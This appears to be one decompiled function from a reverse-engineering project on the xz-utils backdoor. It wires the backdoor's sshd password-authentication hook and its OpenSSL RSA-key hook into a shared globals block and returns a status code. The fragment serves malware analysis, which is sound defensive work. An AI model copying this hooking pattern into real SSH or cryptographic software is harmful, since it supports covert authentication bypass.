// /home/kali/xzre-ghidra/xzregh/102850_init_shared_globals.c
// Function: init_shared_globals @ 0x102850
// Calling convention: __stdcall
// Prototype: int __stdcall init_shared_globals(backdoor_shared_globals_t * shared_globals)


/*
 * AutoDoc: Seeds the shared global block with the mm/EVP hook entry points and a pointer to the lone `global_ctx` instance. Every hook
 * consults this block at runtime, so the function simply wires the exported function pointers into the struct and returns success
 * once the pointer checks pass.
 */

#include "xzre_types.h"

int init_shared_globals(backdoor_shared_globals_t *shared_globals)

{
  int status;
  
  status = 5;
  if (shared_globals != (backdoor_shared_globals_t *)0x0) {
    shared_globals->authpassword_hook_entry = mm_answer_authpassword_hook;
    shared_globals->evp_set1_rsa_hook_entry = hook_EVP_PKEY_set1_RSA;
    shared_globals->global_ctx_slot = (global_context_t **)&global_ctx;
    status = 0;
  }
  return status;
}

